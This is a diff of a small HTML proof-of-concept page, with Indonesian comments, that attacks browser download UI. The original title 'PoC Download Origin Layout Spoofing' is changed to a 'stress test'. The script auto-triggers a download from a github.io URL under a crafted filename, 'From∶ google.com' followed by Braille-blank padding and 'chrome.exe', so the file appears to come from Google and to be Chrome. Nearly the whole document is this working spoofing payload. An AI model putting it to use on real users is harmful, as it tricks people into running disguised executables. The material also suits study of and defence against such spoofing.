@@ -3,119 +3,33 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PoC Download Origin Layout Spoofing</title>
-    <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #0f172a;
-            color: #f8fafc;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            margin: 0;
-            padding: 20px;
-            text-align: center;
-        }
-        .card {
-            background-color: #1e293b;
-            padding: 35px;
-            border-radius: 16px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
-            max-width: 440px;
-            width: 100%;
-        }
-        h2 {
-            font-size: 20px;
-            margin-bottom: 10px;
-            color: #38bdf8;
-        }
-        p {
-            font-size: 13px;
-            color: #94a3b8;
-            margin-bottom: 24px;
-            line-height: 1.5;
-        }
-        button {
-            background-color: #2563eb;
-            color: white;
-            border: none;
-            padding: 14px 20px;
-            font-size: 15px;
-            font-weight: 600;
-            border-radius: 8px;
-            cursor: pointer;
-            width: 100%;
-            transition: background-color 0.2s, transform 0.1s;
-        }
-        button:hover {
-            background-color: #1d4ed8;
-        }
-        button:active {
-            transform: scale(0.98);
-        }
-        .status {
-            margin-top: 20px;
-            font-size: 12px;
-            color: #64748b;
-            background: #0f172a;
-            padding: 12px;
-            border-radius: 8px;
-            word-break: break-all;
-            text-align: left;
-            border: 1px solid #334155;
-        }
-    </style>
+    <title>Layout Exhaustion Test</title>
 </head>
 <body>
-
-    <div class="card">
-        <h2>Download UI Layout Security PoC</h2>
-        <p>Uji coba simulasi unduhan menggunakan payload URL kustom yang menyematkan karakter Unicode khusus.</p>
-        
-        <button onclick="triggerDownloadPoC()">Mulai Unduhan Payload</button>
-
-        <div id="status" class="status">Status: Menunggu interaksi pengguna...</div>
-    </div>
+    <h2>Download Layout Stress Test</h2>
+    <button onclick="triggerStressTest()">Uji Dorongan Baris Vertikal</button>
 
     <script>
-        function updateStatus(message, targetUrl) {
-            const statusEl = document.getElementById('status');
-            statusEl.innerHTML = `<strong>Status:</strong> ${message}<br><br><strong>Target URL:</strong><br><a href="${targetUrl}" style="color: #38bdf8; word-break: break-all;" target="_blank">${targetUrl}</a>`;
-        }
-
-        function triggerDownloadPoC() {
-            // Menggunakan tautan payload Anda secara langsung
+        function triggerStressTest() {
+            // Menggunakan kombinasi U+2800 (Braille Blank) berulang kali 
+            // untuk memaksa alokasi baris vertikal yang masif pada komponen UI.
+            const verticalPadding = "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀";
+            const craftedFilename = "From∶ google.com" + verticalPadding + "chrome.exe";
+            
             const targetUrl = "https://ecdnts-del.github.io/test-apk/From%E2%88%B6%20google.com%20%E2%A0%80%E2%A0%80%E2%A0%80%E2%A0%80%E2%A0%80%20chrome.exe";
-            const craftedFilename = "From∶ google.com ⠀⠀⠀⠀⠀⠀ chrome.exe";
 
-            updateStatus("Memicu unduhan dengan payload kustom...", targetUrl);
-
-            // Membuat elemen anchor dinamis
             const link = document.createElement('a');
             link.href = targetUrl;
             link.download = craftedFilename;
             link.style.display = 'none';
 
             document.body.appendChild(link);
+            link.click();
 
-            // Eksekusi trigger klik otomatis
-            try {
-                link.click();
-                setTimeout(() => {
-                    updateStatus("Unduhan berhasil dipicu! Silakan cek panel notifikasi browser.", targetUrl);
-                }, 300);
-            } catch (err) {
-                updateStatus("Gagal memicu unduhan: " + err.message, targetUrl);
-            }
-
-            // Bersihkan elemen DOM setelah proses berjalan
             setTimeout(() => {
                 document.body.removeChild(link);
-            }, 1000);
+            }, 500);
         }
     </script>
-
 </body>
 </html>
